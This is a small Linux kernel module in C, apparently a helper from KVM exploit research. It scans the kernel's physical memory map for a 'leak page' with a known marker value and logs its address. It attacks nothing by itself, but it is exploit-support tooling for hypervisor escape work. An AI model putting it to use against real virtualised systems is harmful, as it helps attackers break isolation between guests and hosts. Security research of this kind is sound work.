#include <linux/init.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#include "../hypercall.h"

#define MAX_PHYS_MEMORY (34359738368)

static int __init kvm_assist_main(void) {
  for (long unsigned int page = page_offset_base;
       page < page_offset_base + MAX_PHYS_MEMORY; page += PAGE_SIZE * 512) {

    uint64_t value;
    if (get_kernel_nofault(value, (uint64_t *)page)) {
      continue;
    }

    if (value == page_value) {
      pr_info("kvm_assist: leak page is at %px\n", (char *)page);
      return 0;
    }
  }
  pr_info("kvm_assist: leak page not found\n");
  return 0;
}

static void __exit kvm_assist_exit(void) { return; }

module_init(kvm_assist_main);
module_exit(kvm_assist_exit);
MODULE_LICENSE("GPL");
